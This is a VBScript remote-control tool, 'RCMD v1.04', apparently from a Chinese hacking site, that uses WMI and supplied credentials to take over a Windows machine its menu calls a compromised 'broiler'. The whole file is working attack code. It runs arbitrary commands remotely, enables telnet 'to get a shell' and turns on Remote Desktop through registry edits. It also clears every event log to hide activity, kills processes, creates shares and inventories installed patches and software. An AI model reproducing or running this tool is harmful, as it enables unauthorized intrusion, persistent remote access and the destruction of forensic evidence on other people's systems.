on error resume next
set outstreem=wscript.stdout
set instreem=wscript.stdin
if (lcase(right(wscript.fullname,11))="wscript.exe") then
   set objShell=wscript.createObject("wscript.shell")
   objShell.Run("cmd.exe /k cscript //nologo "&chr(34)&wscript.scriptfullname&chr(34))
end if
if wscript.arguments.count<3 then
   usage()
   wscript.echo "Not enough parameters."
   wscript.quit
end if 

ipaddress=wscript.arguments(0)
username=wscript.arguments(1)
password=wscript.arguments(2)

usage()
outstreem.write "Conneting "&ipaddress&"...."
set objlocator=createobject("wbemscripting.swbemlocator") '20
set objswbemservices=objlocator.connectserver(ipaddress,"root/cimv2",username,password)
if errornumber<>0 then
   wscript.echo "Error!"
   call main()
else
   wscript.echo "OK!"
end if
objswbemservices.security_.privileges.add 23,true
objswbemservices.security_.privileges.add 18,true
objswbemservices.security_.privileges.add 7,true
call main()
'***********************************************************
function share()
Wscript.Echo string(18,"-")
Wscript.Echo "0.返回CMD>       ="
wscript.echo "1.列出共享信息:  ="
Wscript.Echo "2.创建共享       ="
Wscript.Echo "3.删除共享       ="
Wscript.Echo string(18,"-")
Wscript.Echo "please chose the parameter:"
parameters=WScript.StdIn.Readline()
Select Case parameters
   case "quit" , "0"
     main()
   case "list" , "1"
     listshare()
   case "open" , "2" '40
     openshare()
   case "close" ,"3"
     closeshare()
end Select 
end function

function listshare()
outstreem.write "Listing the Netshare from "&ipaddress&"...."
Set colShares = objswbemservices.ExecQuery("Select * from Win32_Share")
showerror(err.number) '50
wscript.echo _
    ("Caption"&chr(9)&chr(9)&"Name: "&chr(9)&chr(9)&"Path") 
For each objShare in colShares   
    wscript.echo _
   (objShare.Caption&chr(9)&objShare.Name &chr(9)&chr(9)&objShare.Path)
Next
wscript.echo vbcrlf&"All Share have been listed Successfully!"
call share()
end function

function openshare()
wscript.echo "Enter the path:" '70
path=WScript.StdIn.Readline()
wscript.echo "Enter the name:"
sname=WScript.StdIn.Readline()
Const FILE_SHARE = 0
Const MAXIMUM_CONNECTIONS = 25
Set objNewShare = objswbemservices.Get("Win32_Share")
errReturn = objNewShare.Create _
    (path, sname, FILE_SHARE, _
        MAXIMUM_CONNECTIONS, "默认共享")
wscript.echo "Then Share have been Ceated Successfully!"
call share()
end function

function closeshare()
wscript.echo "Plese Enter The name:"
kname=WScript.StdIn.Readline()
outstreem.write "killing the "&kname&" ...."
Set colShares = objswbemservices.ExecQuery _
    ("Select * from Win32_Share Where Name ="&"'"&kname&"' ")
For Each objShare in colShares
    objShare.Delete
Next
showerror(err.number)
call share()
end function
'***********************************************************
function listsvr()
outstreem.write "Listing the Service from "&ipaddress&"...."
Set colListOfServices = objswbemservices.ExecQuery _
        ("Select * from Win32_Service")
showerror(err.number)
wscript.echo _
    ("Name"&chr(9)&chr(9)&"State"&chr(9)&chr(9)&"Mode"&chr(9)&"Path Name ") 
For Each objService in colListOfServices 
    if len(objService.name)<8 then
      strname=objService.name&chr(9)
    else
      strname=objService.name
    end if
    wscript.echo _
   (strname&chr(9)&objService.State&chr(9)&chr(9)&objService.StartMode&chr(9)&objService.PathName)
Next
wscript.echo vbcrlf&"All Services have been listed Successfully!"
call main()
end function
'************************************************************
function reboot()
outstreem.write "Now, restarting target...."
strwqlquery="select * from win32_operatingsystem where primary='true'"
set colinstances=objswbemservices.execquery(strwqlquery)
for each objinstance in colinstances
objinstance.win32shutdown(6)
next
showerror(err.number)
call main()
end function
'*************************************************************
function inf()
outstreem.write "Getting Infomation from "&ipaddress&"...."
set obj1=objget("win32_computersystem")
showerror(err.number)
wscript.echo ""&vbcrlf
set obj2=objget("win32_operatingsystem")
set col3=objswbemservices.instancesof("win32_processor")
set obj4=objget("win32_logicalmemoryconfiguration")
set obj5=objget("win32_bios")
set obj6=objget("win32_displayconfiguration")
set col7=objswbemservices.instancesof("win32_diskdrive")
set col8=objswbemservices.instancesof("win32_logicaldisk")
set col9=objswbemservices.instancesof("win32_networkadapterconfiguration")
set col10=objswbemservices.instancesof("win32_quickfixengineering")

wnl "OS Info :"
wnl "  Computer Name : "&obj1.name
wnl "  User Name : "&obj1.username
wnl "  Domain : "&obj1.domain
domainrole=""
select case obj1.domainrole
case 0
   domainrole="Workstation"
case 1
   domainrole="Member Workstation"
case 2
   domainrole="Server"
case 3
   domainrole="Member Server"
case 4
   domainrole="Backup Domain Controller"
case 5
   domainrole="Main Domain Controller"
end select
with obj2
wnl "  Domain Role : "&domainrole
wnl "  Caption : "&.caption
wnl "  Organization : "&.organization
wnl "  Registered User : "&.registereduser
wnl "  Install Date : "&timeformat(.installdate)
wnl "  Last BootUp Time : "&timeformat(.lastbootuptime)
wnl "  Windows Directory : "&.windowsdirectory
wnl "  System Directory : "&.systemdirectory
wnl "  Boot Device : "&.bootdevice
wnl "  Country Code : "&.countrycode
wnl "  CSName : "&.csname
wnl "  Description : "&.description
wnl "  Manufacturer : "&.manufacturer
wnl "  Serial Number : "&.serialnumber
wnl "  Version : "&.version
wnl "  System Type : "&obj1.systemtype
wnl "  System Startup Delay : "&obj1.systemstartupdelay&"s"
wnl "  System Startup Options : "&obj1.systemstartupoptions(0)
for i=1 to ubound(obj1.systemstartupoptions)
   wnl space(28)&obj1.systemstartupoptions(i)
next
end with

wnl vbcrlf&"Processor Info :"
wnl "  Number Of Processors : "&obj1.numberofprocessors
for each obj3 in col3
with obj3
wnl "  Device ID : "&.deviceid
wnl "  Name : "&.name
wnl "  Current Clock Speed : "&.currentclockspeed&"MHz"
wnl "  Description : "&.description
wnl "  Ext Clock : "&.extclock&"MHz"
wnl "  L2 Cache Size : "&.l2cachesize&"KB"
wnl "  L2 Cache Speed : "&.l2cachespeed&"MHz"
wnl "  Processor Id : "&.processorid
wnl "  Manufacturer : "&.manufacturer
wnl "  Socket Designation : "&.socketdesignation
wnl "  Address Width : "&.addresswidth&"Bit"
wnl "  Data Width : "&.datawidth&"Bit"
end with
next

with obj4
wnl vbcrlf&"Memory Info :"
wnl "  Total Physical Memory : "&cint(.totalphysicalmemory/1024)&"MB"
wnl "  Free Physical Memory : "&cint(obj2.freephysicalmemory/1024)&"MB"
wnl "  Total PageFile Space : "&cint(.totalpagefilespace/1024)&"MB"
wnl "  Total Virtual Memory : "&cint(.totalvirtualmemory/1024)&"MB"
wnl "  Available Virtual Memory : "&cint(.availablevirtualmemory/1024)&"MB"
end with

wnl vbcrlf&"BIOS Info :"
wnl "  Description : "&obj5.description
wnl "  Current Language : "&obj5.currentlanguage
wnl "  Version : "&obj5.version
wnl "  Manufacturer : "&obj5.manufacturer


with obj6
wnl vbcrlf&"Display Configuration :"
wnl "  Caption : "&.caption
wnl "  Device Name : "&.devicename
wnl "  Driver Version : "&.driverversion
wnl "  Display Frequency : "&.displayfrequency&"Hz"
wnl "  Bits Per Pel : "&.bitsperpel&"Bit"
wnl "  Pels : "&.pelswidth&" x "&.pelsheight
end with

wnl vbcrlf&"Disk Info :"
for each obj7 in col7
with obj7
wnl "  DeviceID : "&.deviceid
wnl "  Caption : "&.caption
wnl "  Interface Type : "&.interfacetype
wnl "  SCSI Bus : "&.scsibus
wnl "  SCSI Logical Unit : "&.scsilogicalunit
wnl "  SCSI Port : "&.scsiport
wnl "  SCSI TargetId : "&.scsitargetid
wnl "  Sectors Per Track : "&.sectorspertrack&"KB"
wnl "  Partitions : "&.partitions
wnl "  Size : "&sizeformat(.size)
end with
next
str="  Volume"+space(2)+"Type"+space(8)+"Format"+space(4)
str=str+"Size"+space(6)+"Free"+space(12)+"Label"
wnl str
for each obj8 in col8
with obj8
drivetype=""
select case .drivetype
case 0
   drivetype="Unknow"
case 1
   drivetype="NoRootDir"
case 2
   drivetype="Removable"
case 3
   drivetype="Fixed"
case 4
   drivetype="Network"
case 5
   drivetype="CD-ROM"
case 6
   drivetype="RAM"
end select
strpercent=""
if .size<>"" and .freespace<>"" then
strpercent=" ("&formatpercent(.freespace/.size,0)&")"
end if
str="  "&wsp(.caption,8)&wsp(drivetype,12)&wsp(.filesystem,10)&wsp(sizeformat(.size),10)
str=str&wsp(sizeformat(.freespace)&strpercent,16)&.volumename
wnl str
end with
next

wnl vbcrlf&"NIC Informaton :"
for each obj9 in col9
with obj9
if .IPEnabled then
wnl "  Index : "&.index
wnl "  Description : "&.description
wnl "  DHCP Enabled : "&.dhcpenabled
wnl "  DHCP Server : "&.dhcpserver
wnl "  DNS Host Name : "&.dnshostname
wnl "  DNS Server Search Order : "&wfl(.dnsserversearchorder)
wnl "  WINS Primary Server : "&.winsprimaryserver
wnl "  IP Address : "&wfl(.ipaddress)
wnl "  MAC Address : "&.macaddress
wnl "  Default IP Gateway : "&wfl(.defaultipgateway)
wnl "  IP Subnet : "&wfl(.ipsubnet)
wnl "  IP Filter Security Enabled : "&.ipfiltersecurityenabled
wnl "  IPSec Permit IP Protocols : "&wfl(.ipsecpermitipprotocols)
wnl "  IPSec Permit TCP Ports : "&wfl(.ipsecpermittcpports)
wnl "  IPSec Permit UDP Ports : "&wfl(.ipsecpermitudpports)
end if
end with
next

wnl vbcrlf&"Hot Fixes Info :"
for each obj10 in col10
wnl "  Hot Fix ID : "&obj10.hotfixid
wnl "  Fix Comments : "&obj10.fixcomments
wnl "  Install Date : "&obj10.installdate
wnl "  Service Pack In Effect : "&obj10.servicepackineffect
next

wnl vbcrlf&"Applications :"
set objswb1=objlocator.connectserver(ipaddress,"root/default",username,password)
   set obj11=objswb1.get("stdregprov")
HKLM=&h80000002
keypath="SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\"
obj11.enumkey HKLM,keypath,keyarray
redim str(ubound(keyarray)+1)
j=0
for i=0 to ubound(keyarray)
   obj11.getstringvalue HKLM,keypath+keyarray(i),"displayname",strvalue
   if strvalue<>"" then
   str(j)=strvalue
   j=j+1
   end if
next
if j>1 then
for i=0 to j-1
   for k=0 to j-i-1
      if strcomp(str(k),str(k+1),1)=1 then
	 strtemp=str(k+1)
	 str(k+1)=str(k)
	 str(k)=strtemp
      end if
   next
next
end if
for i=0 to j-1
   wnl "  "&str(i)
next
wscript.echo ""&vbcrlf
wscript.echo "The Infomation from &ipaddress& had been listed  Successfully!"
call main()
end function

sub wnl(msg)
wscript.echo msg
if isobject(of) then
   on error resume next
   of.writeline msg
   showerror()
   on error goto 0
end if
end sub

function wfl(byref obj)
str=""
for i=0 to ubound(obj)
   str=str&obj(i)&" "
next
wfl=str
end function

function wsp(msg,num)
if msg<>"" then
   msg=left(msg,num-1)
   wsp=msg&space(num-len(msg))
else
   wsp=space(num)
end if
end function

function timeformat(msg)
timeformat=left(msg,4)&"/"&mid(msg,5,2)&"/"&mid(msg,7,2)&" "&mid(msg,9,2)&":"&mid(msg,11,2)&":"&mid(msg,13,2)
end function

function sizeformat(msg)
if msg<>"" then
size=msg/1048576
if size>1024 then
  sizeformat=round(size/1024,2)&"GB"
else
  sizeformat=round(size,1)&"MB"
end if
end if
end function

function objget(msg)
set col=objswbemservices.instancesof(msg)
for each objx in col
   set obj=objx
next
set objget=obj
end function

'******************************************
function command()
wscript.echo "Plese Enter The Command:"
call run()
end function

function run()
strcmdline=WScript.StdIn.Readline()
 if strcmdline="exit" or strcmdline="quit" or strcmdline="0" then
 call main()
 end if
outstreem.write "Running the command ...."
   set objinstance=objswbemservices.get("win32_process")
   set objmethod=objinstance.methods_("create")
   set objinparam=objmethod.inparameters.spawninstance_()
   objinparam.commandline=strcmdline
   set objoutparam=objinstance.execmethod_("create",objinparam)
   if objoutparam.returnvalue<>0 then
     wscript.echo "Error!"
     call command()
   else
     wscript.echo "OK!"
   end if
   wscript.echo "The Process ID is "&objoutparam.processid
   wscript.echo "Runing command:"&strcmdline&". to "&ipaddress&" Successfully!"&vbcrlf  
call command()
end function
'*******************************************
function pslist()
outstreem.write "Listing process...."
   set colinstances=objswbemservices.execquery("select * from win32_process")
   showerror(err.number)
   wscript.echo vbcrlf&"Name"&chr(9)&chr(9)&"Pid"&chr(9)&"ExecutablePath"
   for each objinstance in colinstances
   if len(objinstance.name)<8 then
      strname=objinstance.name&chr(9)
   else
      strname=objinstance.name
   end if
   wscript.echo strname&chr(9)&objinstance.handle&chr(9)&objinstance.executablepath
   next
   wscript.echo vbcrlf&"All process have been listed Successfully!"
call main()
end function
'*****************************************
function pskill()
wscript.echo "plese enter the process's id:"
strprocess=WScript.StdIn.Readline()
  outstreem.write "Killing id="&strprocess&" process...."
   set objinstance=objswbemservices.get("win32_process.handle="&"'"&strprocess&"'")
   if vartype(objinstance)<>vbobject then
      wscript.echo vbcrlf&"Specified process is not exist."
      call main()
   else
      set objmethod=objinstance.methods_("terminate")
      set objinparam=objmethod.inparameters.spawninstance_()
      objinparam.reason=0
      set objoutparam=objinstance.execmethod_("terminate",objinparam)
      showerror(objoutparam.returnvalue)
      wscript.echo "The process's id="&strprocess&" have been killed Successfully!"
   end if
   call main()
end function
'********************************************************
function telnet()
outstreem.write "Querying state of telnet server...."
set objswbemservices=objlocator.connectserver(ipaddress,"root\cimv2",username,password)
set colinstances=objswbemservices.execquery("select * from win32_service where name='tlntsvr'")
showerror(err.number)
for each objinstance in colinstances
if objinstance.startmode="Disabled" then
   outstreem.write "Telnet server has been disabled. Now changeing start mode to manual...."
   set objmethod=objinstance.methods_("changestartmode")
   set objinparam=objmethod.inparameters.spawninstance_()
   objinparam.startmode="Manual"
   set objoutparam=objinstance.execmethod_("changestartmode",objinparam)
   showerror(objoutparam.returnvalue)
end if
outstreem.write "Changeing state...."
if objinstance.started=true then
   intstatus=objinstance.stopservice()
   showerror(intstatus)
   wscript.echo "Target telnet server has been STOP Successfully."
else
showerror(intstatus)
wscript.echo "plese enter the ntlm:"
ntlm=WScript.StdIn.Readline()
wscript.echo "plese enter the port:"
port=WScript.StdIn.Readline()
if not isnumeric(ntlm) or ntlm<0 or ntlm>2 then
   wscript.echo "The value of NTML is wrong."
   wscript.quit
end if
if not isnumeric(port) then
   wscript.echo "The value of port is wrong."
   main()
end if
set objswbemservices1=objlocator.connectserver(ipaddress,"root/default",username,password)
outstreem.write "Setting NTLM="&ntlm&"...."
set objinstance1=objswbemservices1.get("stdregprov")
set objmethod=objinstance1.methods_("SetDWORDvalue")
set objinparam=objmethod.inparameters.spawninstance_()
objinparam.hdefkey=&h80000002
objinparam.ssubkeyname="SOFTWARE\Microsoft\TelnetServer\1.0"
objinparam.svaluename="NTLM"
objinparam.uvalue=ntlm
set objoutparam=objinstance1.execmethod_("SetDWORDvalue",objinparam)
showerror(objoutparam.returnvalue)
outstreem.write "Setting port="&port&"...."
objinparam.svaluename="TelnetPort"
objinparam.uvalue=port
set objoutparam=objinstance1.execmethod_("SetDWORDvalue",objinparam)
showerror(objoutparam.returnvalue)
   intstatus=objinstance.startservice()
   wscript.echo "Target telnet server has been START Successfully!"
   wscript.echo "Now, you can try: telnet "&ipaddress&" "&port&", to get a shell."
end if
next
call main()
end function
'********************************************************
function rs()
outstreem.write "Checking The OS Type ...."
set colinstoscaption=objswbemservices.execquery("select caption from win32_operatingsystem")
for each objinstoscaption in colinstoscaption
   if instr(objinstoscaption.caption,"Server")>0 then
      wscript.echo "OK!"
   else 
      wscript.echo "OK!"
      wscript.echo "OS Type is "&objinstoscaption.caption
      wscript.echo "you cann't open terminal services,canceling...."&chr(13) '60
      call main()
   end if 
next
wscript.echo "plese enter the port:"
port=WScript.StdIn.Readline()
if not isnumeric(port) or port<1 or port>65000 then '50
   wscript.echo "The number of port is error." 
   call main()
end if
outstreem.write "Writing into registry ...."
set objinstreg=objlocator.connectserver(ipaddress,"root/default",username,password).get("stdregprov")
HKLM=&h80000002
with objinstreg
.createkey ,"SOFTWARE\Microsoft\Windows\CurrentVersion\netcache"
.setdwordvalue HKLM,"SOFTWARE\Microsoft\Windows\CurrentVersion\netcache","Enabled",0 '70
.createkey HKLM,"SOFTWARE\Policies\Microsoft\Windows\Installer"
.setdwordvalue HKLM,"SOFTWARE\Policies\Microsoft\Windows\Installer","EnableAdminTSRemote",1 
.setdwordvalue HKLM,"SYSTEM\CurrentControlSet\Control\Terminal Server","TSEnabled",1
.setdwordvalue HKLM,"SYSTEM\CurrentControlSet\Services\TermDD","Start",2
.setdwordvalue HKLM,"SYSTEM\CurrentControlSet\Services\TermService","Start",2
.setstringvalue HKLM,".DEFAULT\Keyboard Layout\Toggle","Hotkey","1"
.setdwordvalue HKLM,"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp","PortNumber",port
end with
showerror(err.number)
wscript.echo "Now, you need to reboot target!"
wscript.echo "Do you want to reboot target now ?[y/n]"
strcancel=WScript.StdIn.Readline()
      if strcancel="n" then 
      wscript.echo "you need to reboot target then!!"
      call main() 
      else 
      call reboot()
      end if
wscript.echo "You can logon terminal services on "&port&" later,Good luck!"
call main() 
end Function
'**************************************************************
function clog()
outstreem.write "Clearing all logs...."
   strwqlquery="select * from Win32_NTEventLogFile"
   set colinstances=objswbemservices.execquery(strwqlquery,"wql",&h20)
   for each objinstance in colinstances
      if objinstance.cleareventlog()<>0 then
         wscript.echo "Error!" '100
         call main()
      end if
   next
   wscript.echo "OK!"
   wscript.echo "All logs have been cleared Successfully!"
   call main()
end function
'***************************************************************
function showerror(errornumber)
if errornumber<>0 then
   wscript.echo "Error!"
   call main()
else
   wscript.echo "OK!"
end if
end function
'*****************************************************************
function usage()
wscript.echo string(79,"*")
wscript.echo "RCMD v1.04"
wscript.echo "Remote execution Script, by 黑嘿黑"
wscript.echo "Welcome to visite www.xyhack.91i.net"
wscript.echo "QQ:123230273 E-mail:cnhacker521@hotmail.com"
wscript.echo "Usage:"
wscript.echo "cscript "&wscript.scriptfullname&" targetIP username password "
wscript.echo "Then chose the command>"
wscript.echo string(79,"*")
end function
'**********************************************************
function main()
wscript.echo ""
wscript.echo "Now chose the command>"
wscript.echo "0.quit     退出脚本"
wscript.echo "1.telnet   远程开/关telnet"
wscript.echo "2.3389     远程开3389"
wscript.echo "3.clog     远程删除所有日志"
wscript.echo "4.getf     获取肉鸡系统信息"
wscript.echo "5.pslist   例出进程"
wscript.echo "6.pskill   删除进程"
wscript.echo "7.command  远程执行DOS命令"
wscript.echo "8.reboot   远程重启肉鸡"
wscript.echo "9.slist    例出远程肉鸡上的服务信息"
wscript.echo "A.Share    1.列出共享 2.创建共享 3.删除共享"
wscript.echo string(79,"*")
wscript.echo "CMD>"
cmd=WScript.StdIn.Readline()  
wscript.echo ""
Select Case cmd
   case "telnet" , "1"
     telnet()
   case "3389" , "2"
     rs()
   case "clog" , "3"
     clog()
   case "getf" , "4"
     inf()
   case "psl" , "pslist" , "5"
     pslist()
   case "psk" , "pskill" , "6"
     pskill()
   case "cmd" , "command" , "7"
     command()
   case "reboot" , "8"
     reboot()
   case "slist" , "9"
     list listsvr()
   case "share" , "10" ,"a" ,"A"
     share()
   case "quit" , "0"
     wscript.quit
end select
end function

